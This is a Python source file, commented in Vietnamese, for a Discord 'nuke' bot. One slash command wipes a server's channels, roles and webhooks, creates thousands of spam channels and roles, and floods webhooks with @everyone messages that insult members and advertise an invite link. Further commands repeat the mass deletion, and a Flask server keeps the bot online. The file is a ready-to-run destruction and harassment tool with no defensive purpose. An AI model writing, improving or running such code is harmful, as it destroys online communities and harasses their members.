# bot.py - Nuke with Webhook Spam, giữ lại kênh dùng lệnh
import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import os
import random
import aiohttp
from flask import Flask, jsonify
import threading

app = Flask(__name__)

TOKEN = os.getenv('DISCORD_TOKEN', '')
PORT = int(os.getenv('PORT', 10000))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='', intents=intents, help_command=None)

class NukeCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.rate_limit_delay = 0.3
        self.channel_count = 50000
        self.role_count = 100
        self.spam_per_channel = 10

    @app_commands.command(name='nuke', description='🔥 Nuke server - giữ kênh dùng lệnh, tạo kênh, role, spam webhook')
    @app_commands.default_permissions(administrator=True)
    async def slash_nuke(self, interaction: discord.Interaction):
        await interaction.response.send_message('🔥 **NUKE STARTED** 🔥', ephemeral=False)
        guild = interaction.guild
        current_channel = interaction.channel  # Kênh đang dùng lệnh

        # Xóa các kênh khác (trừ kênh hiện tại)
        await interaction.channel.send('🗑️ Deleting other channels...')
        deleted = await self.delete_all_channels_except(guild, current_channel)
        await interaction.channel.send(f'✅ Deleted {deleted} channels')

        # Xóa role và webhook
        await interaction.channel.send('🗑️ Deleting roles and webhooks...')
        deleted_roles = await self.delete_all_roles(guild)
        deleted_webhooks = await self.delete_all_webhooks(guild)
        await interaction.channel.send(f'✅ Deleted {deleted_roles} roles, {deleted_webhooks} webhooks')

        # Tạo kênh mới (vẫn giữ kênh hiện tại)
        await interaction.channel.send(f'📝 Creating {self.channel_count} new channels...')
        created = await self.create_spam_channels(guild)
        await interaction.channel.send(f'✅ Created {created} channels')

        # Tạo role spam
        await interaction.channel.send(f'👑 Creating {self.role_count} roles...')
        created_roles = await self.create_spam_roles(guild)
        await interaction.channel.send(f'✅ Created {created_roles} roles')

        # Đợi cache sync
        await interaction.channel.send('⏳ Syncing channels...')
        await asyncio.sleep(5)

        # Spam bằng webhook (trên tất cả kênh, bao gồm kênh hiện tại)
        await interaction.channel.send('💬 Spamming via webhooks...')
        spammed = await self.spam_via_webhooks(guild)
        await interaction.channel.send(f'✅ Sent {spammed} messages')

        embed = discord.Embed(
            title='✅ NUKE COMPLETE',
            color=discord.Color.red()
        )
        embed.add_field(name='📊 Channels', value=f'{created:,}', inline=True)
        embed.add_field(name='👑 Roles', value=f'{created_roles:,}', inline=True)
        embed.add_field(name='💬 Webhook Spam', value=f'{spammed:,}', inline=True)
        await interaction.channel.send(embed=embed)

    @app_commands.command(name='unnuke', description='🧹 Xóa tất cả kênh (trừ kênh hiện tại) và role')
    @app_commands.default_permissions(administrator=True)
    async def slash_unnuke(self, interaction: discord.Interaction):
        await interaction.response.send_message('🧹 Unnuke...', ephemeral=False)
        guild = interaction.guild
        current_channel = interaction.channel
        deleted = await self.delete_all_channels_except(guild, current_channel)
        deleted_roles = await self.delete_all_roles(guild)
        await interaction.channel.send(f'✅ Deleted {deleted} channels, {deleted_roles} roles')

    @app_commands.command(name='clear', description='🗑️ Xóa tất cả kênh, role, webhook (trừ kênh hiện tại)')
    @app_commands.default_permissions(administrator=True)
    async def slash_clear(self, interaction: discord.Interaction):
        await interaction.response.send_message('🗑️ Clearing...', ephemeral=False)
        guild = interaction.guild
        current_channel = interaction.channel
        d1 = await self.delete_all_channels_except(guild, current_channel)
        d2 = await self.delete_all_roles(guild)
        d3 = await self.delete_all_webhooks(guild)
        await interaction.channel.send(f'✅ Deleted {d1} channels, {d2} roles, {d3} webhooks')

    # ---------- HÀM XÓA (GIỮ KÊNH HIỆN TẠI) ----------
    async def delete_all_channels_except(self, guild, keep_channel):
        count = 0
        for channel in guild.channels:
            if channel.id == keep_channel.id:
                continue
            try:
                await channel.delete()
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        return count

    async def delete_all_roles(self, guild):
        count = 0
        for role in guild.roles:
            if role.name != '@everyone':
                try:
                    await role.delete()
                    count += 1
                    await asyncio.sleep(0.2)
                except:
                    pass
        return count

    async def delete_all_webhooks(self, guild):
        count = 0
        webhooks = await guild.webhooks()
        for wh in webhooks:
            try:
                await wh.delete()
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        return count

    # ---------- TẠO KÊNH + ROLE ----------
    async def create_spam_channels(self, guild, count=None):
        if count is None:
            count = self.channel_count
        created = 0
        for i in range(count):
            try:
                await guild.create_text_channel(f'NUKE-{i}')
                created += 1
                if created % 100 == 0:
                    print(f'✅ Created {created}/{count} channels')
                await asyncio.sleep(0.3)
            except discord.errors.RateLimited as e:
                await asyncio.sleep(e.retry_after + 1)
            except:
                pass
        return created

    async def create_spam_roles(self, guild, count=None):
        if count is None:
            count = self.role_count
        created = 0
        for i in range(count):
            try:
                await guild.create_role(
                    name=f'NUKE-ROLE-{i}',
                    color=discord.Color(random.randint(0, 0xFFFFFF)),
                    hoist=True,
                    mentionable=True
                )
                created += 1
                await asyncio.sleep(0.3)
            except:
                pass
        return created

    # ---------- SPAM BẰNG WEBHOOK (SIÊU NHANH) ----------
    async def spam_via_webhooks(self, guild):
        messages = [
            '@everyone SERVER DA BI NUKE',
            '@everyone NUKE ME MAY NEK',
            '@everyone https://discord.gg/xnyxd6QEa',
            '@everyone SERVER NAY DA BI PHA HUY',
            '@everyone MAY CHET CHUA CON NGU',
            '@everyone TAM BIET SERVER NHE',
            '@everyone HAHA NUKE THANH CONG'
        ]
        text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
        print(f'📢 Found {len(text_channels)} text channels')

        if not text_channels:
            return 0

        sent = 0
        async with aiohttp.ClientSession() as session:
            # Tạo webhook cho mỗi kênh (tối đa 10 kênh cùng lúc để tránh rate limit)
            webhooks = []
            for channel in text_channels[:50]:  # Giới hạn 50 kênh để tránh quá tải
                try:
                    webhook = await channel.create_webhook(name='SPAMMER')
                    webhooks.append(webhook)
                    await asyncio.sleep(0.3)
                except:
                    pass

            if not webhooks:
                print('⚠️ Không tạo được webhook nào!')
                return 0

            print(f'✅ Created {len(webhooks)} webhooks')

            # Spam qua từng webhook (gửi song song)
            tasks = []
            for webhook in webhooks:
                for _ in range(self.spam_per_channel):
                    msg = random.choice(messages)
                    url = f'https://discord.com/api/webhooks/{webhook.id}/{webhook.token}'
                    tasks.append(
                        session.post(url, json={'content': msg})
                    )
                    sent += 1
                    if len(tasks) >= 20:  # Giới hạn concurrent
                        await asyncio.gather(*tasks)
                        tasks = []
                        await asyncio.sleep(0.1)

            if tasks:
                await asyncio.gather(*tasks)

        return sent

    # ---------- HÀM SPAM BẰNG BOT (DỰ PHÒNG) ----------
    async def spam_all_channels(self, guild, count=None):
        if count is None:
            count = self.spam_per_channel
        sent = 0
        messages = [
            '@everyone SERVER DA BI NUKE',
            '@everyone NUKE ME MAY NEK',
            '@everyone https://discord.gg/xnyxd6QEa',
            '@everyone SERVER NAY DA BI PHA HUY',
            '@everyone MAY CHET CHUA CON NGU',
            '@everyone TAM BIET SERVER NHE',
            '@everyone HAHA NUKE THANH CONG'
        ]
        channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
        for channel in channels:
            try:
                perms = channel.permissions_for(guild.me)
                if not perms.send_messages:
                    continue
                for _ in range(count):
                    await channel.send(random.choice(messages))
                    sent += 1
                    await asyncio.sleep(0.3)
            except:
                pass
        return sent

# ---------- SỰ KIỆN ----------
@bot.event
async def on_ready():
    print(f'✅ Bot: {bot.user}')
    print(f'📡 Servers: {len(bot.guilds)}')
    try:
        synced = await bot.tree.sync()
        print(f'✅ Synced: {[c.name for c in synced]}')
    except Exception as e:
        print(f'❌ Sync error: {e}')

# ---------- FLASK ----------
@app.route('/')
def index():
    return jsonify({'status': 'online', 'bot': str(bot.user)})

@app.route('/ping')
def ping():
    return jsonify({'pong': True})

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'})

# ---------- CHẠY ----------
async def run_bot():
    await bot.add_cog(NukeCommands(bot))
    await bot.start(TOKEN)

def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    try:
        asyncio.run(run_bot())
    except:
        pass
